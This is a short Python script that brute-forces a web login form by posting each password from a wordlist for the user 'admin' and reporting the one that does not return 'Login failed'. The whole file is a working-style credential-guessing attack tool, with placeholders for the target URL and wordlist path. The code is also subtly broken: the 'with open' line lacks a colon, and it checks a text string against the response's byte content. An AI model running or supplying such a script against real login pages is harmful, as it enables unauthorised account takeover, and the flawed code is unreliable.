#!/usr/bin/env python

import requests

target_url = ""
data_dict = {"username" : "admin", "password":"", "Login": "submit"}

with open("location of password list", "r") as wordlist
    for line in wordlist:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Password not in wordlist :(")